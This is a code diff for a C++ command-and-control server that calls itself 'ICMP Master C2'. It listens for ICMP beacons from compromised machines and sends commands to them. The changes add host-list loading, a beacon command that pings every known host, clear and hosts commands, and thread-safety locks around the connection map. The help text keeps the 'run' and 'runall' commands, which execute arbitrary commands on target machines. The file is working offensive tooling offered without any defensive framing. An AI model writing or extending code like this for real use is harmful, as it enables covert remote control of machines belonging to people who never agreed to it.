@@ -20,8 +20,10 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
-static std::map<std::string, std::string> cur_connections;
-static std::mutex cur_connections_mutex;
+static std::map<std::string, std::string> active_connections;
+static std::map<std::string, std::string> hosts;
+static bool listening = false;
+static std::mutex active_connections_mutex;
 
 static uint16_t checksum(void *vdata, uint32_t size)
 {
@@ -173,8 +175,8 @@ void listen_task()
       auto split = split_input(hostname);
       if (split.at(0).compare("(beacon)") == 0)
       {
-        std::lock_guard<std::mutex> guard(cur_connections_mutex);
-        cur_connections[split.at(1)] = src_ip;
+        std::lock_guard<std::mutex> guard(active_connections_mutex);
+        active_connections[split.at(1)] = src_ip;
       }
     }
   }
@@ -232,10 +234,22 @@ void export_connections(const std::string &filename)
   std::ofstream file(filename);
   if (file.is_open())
   {
-    auto it = cur_connections.begin();
-    for (it; it != cur_connections.end(); it++)
+    std::lock_guard<std::mutex> guard(active_connections_mutex);
+    auto it = active_connections.begin();
+    for (it; it != active_connections.end(); it++)
     {
-      file << it->first << ": " << it->second << "\n";
+      file << it->first << " " << it->second << "\n";
+    }
+    file.close();
+  }
+}
+
+void load_connections(const std::string &filename) {
+  std::ifstream file(filename);
+  if (file.is_open()) {
+    std::string host, ip;
+    while (file >> host >> ip) {
+      hosts[host] = ip;
     }
     file.close();
   }
@@ -246,18 +260,26 @@ void help()
   std::puts("ICMP Master C2!");
   std::puts("Current commands:");
   std::puts("\thelp: display this message");
-  std::puts("\tstart: Begin listening for connections");
-  std::puts("\tlist: List active connections");
-  std::puts("\tping [ip]");
-  std::puts("\tpingh [host]");
+  std::puts("\tstart: begin listening for connections");
+  std::puts("\tlist: list active connections");
+  std::puts("\thosts: list all hosts");
+  std::puts("\tping [ip]: ping an ip");
+  std::puts("\tpingh [host]: ping a host");
+  std::puts("\tbeacon: clears active cache and pings all machines");
   std::puts("\trun [host] [command]: run a command on a target machine");
   std::puts("\trunall [command]: runs command on all machines");
   std::puts("\texport [filename]: exports currently connected hosts to file");
-  std::puts("\texit: Exit program!");
+  std::puts("\tload [filename]: loads file to hosts list");
+  std::puts("\tclear: clears currently connected list");
+  std::puts("\texit: exit program!");
 }
 
 int main(int argc, char **argv)
 {
+  if (argc > 1) {
+    load_connections(argv[1]);
+  }
+
   help();
 
   while (1)
@@ -274,16 +296,31 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("start") == 0)
     {
+      if (listening) {
+        std::puts("Already listening!");
+        continue;
+      }
       std::thread listen_thread(listen_task);
       listen_thread.detach();
+      listening = true;
     }
     else if (input_arr.at(0).compare("list") == 0)
     {
-      std::puts("Listing current machines!");
-      std::lock_guard<std::mutex> guard(cur_connections_mutex);
+      std::puts("Listing active machines!");
+      std::lock_guard<std::mutex> guard(active_connections_mutex);
 
-      auto it = cur_connections.begin();
-      for (it; it != cur_connections.end(); it++)
+      auto it = active_connections.begin();
+      for (it; it != active_connections.end(); it++)
+      {
+        std::cout << it->first << ": " << it->second << "\n";
+      }
+    }
+    else if (input_arr.at(0).compare("hosts") == 0)
+    {
+      std::puts("Listing host machines!");
+
+      auto it = hosts.begin();
+      for (it; it != hosts.end(); it++)
       {
         std::cout << it->first << ": " << it->second << "\n";
       }
@@ -305,9 +342,20 @@ int main(int argc, char **argv)
         std::puts("usage: pingh [host]");
         continue;
       }
-      std::string ip = cur_connections[input_arr.at(1)];
+      std::string ip = active_connections[input_arr.at(1)];
       ping(ip);
       std::cout << "Sending ping to: " << ip << "\n";
+    }
+    else if (input_arr.at(0).compare("beacon") == 0)
+    {
+      std::lock_guard<std::mutex> guard(active_connections_mutex);
+      active_connections.clear();
+      auto it = hosts.begin();
+      for (it; it != hosts.end(); it++)
+      {
+        std::cout << "Beaconing: " << it->second << "\n";
+        ping(it->second);
+      }
     }
     else if (input_arr.at(0).compare("run") == 0)
     {
@@ -317,7 +365,7 @@ int main(int argc, char **argv)
         continue;
       }
 
-      std::string ip = cur_connections[input_arr.at(1)];
+      std::string ip = active_connections[input_arr.at(1)];
       std::string command;
       for (int i = 2; i < input_arr.size(); i++)
       {
@@ -351,8 +399,9 @@ int main(int argc, char **argv)
         }
       }
 
-      auto it = cur_connections.begin();
-      for (it; it != cur_connections.end(); it++)
+      std::lock_guard<std::mutex> guard(active_connections_mutex);
+      auto it = active_connections.begin();
+      for (it; it != active_connections.end(); it++)
       {
         std::cout << "Running command \"" << command << "\" on "
                   << it->second
@@ -373,6 +422,21 @@ int main(int argc, char **argv)
       }
       std::cout << "Exporting to: " << filename << "\n";
       export_connections(filename);
+    }
+    else if (input_arr.at(0).compare("load") == 0)
+    {
+      if(input_arr.size() < 2) {
+        std::puts("usage: load [filename]");
+        continue;
+      }
+      std::cout << "Loading from: " << input_arr.at(1) << "\n";
+      load_connections(input_arr.at(1));
+    }
+    else if (input_arr.at(0).compare("clear") == 0) 
+    {
+      std::puts("Clearing active connections");
+      std::lock_guard<std::mutex> guard(active_connections_mutex);
+      active_connections.clear();
     }
     else if (input_arr.at(0).compare("exit") == 0)
     {
